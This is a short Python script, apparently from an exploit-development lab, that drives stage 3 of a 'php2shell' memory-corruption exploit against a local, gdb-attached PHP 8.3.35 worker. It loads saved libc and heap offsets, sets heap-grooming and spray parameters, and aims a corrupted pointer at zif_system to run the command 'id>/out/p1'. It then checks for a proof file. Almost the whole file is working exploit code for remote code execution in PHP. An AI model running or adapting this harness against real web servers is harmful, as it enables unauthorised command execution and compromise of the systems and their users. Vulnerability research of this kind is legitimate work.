#!/usr/bin/env python3
"""Trigger the stage-3 crash on the gdb-attached 8.3.35 worker.

No rotate here: the worker gdb is attached to must be the one that
processes both stage-3 requests (groom survives gracefully; the
carrier+spray request crashes at shutdown).
"""
from __future__ import annotations

import json
import os
import sys

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402

STATE = "/tmp/p2s-fs-8335.json"

with open(STATE, encoding="utf-8") as fh:
    s = json.load(fh)

sym = {"zif_system": s["zif"], "zval_ptr_dtor": s["dtor"]}
mod = C.load_upstream(VENDOR)
t = mod.Target(f"http://127.0.0.1:{s['port']}/index.php", verbose=False)
ex = mod.Exploit(t, "id>/out/p1", zif_offset=s["zif"],
                 dtor_offset=s["dtor"], profile="bookworm", verbose=False)

os.environ["P2S_CARRIER_LEN"] = "15"
ex.stage3_carrier = True
ex.stage3_pads = [(31, 31)] * 6

AIM = 0x690D8
try:
    ex.stage3(s["chunk"] + AIM, s["lib"] + s["zif"])
    raw = getattr(ex, "last3", b"") or b""
    print(f"[*] stage-3 done: {len(raw)} bytes response")
except Exception as exc:
    print(f"[!] stage-3 exception: {type(exc).__name__}: {exc}")
ok = os.path.exists(s["proof"]) and os.path.getsize(s["proof"]) > 0
print(f"[*] proof={ok}")
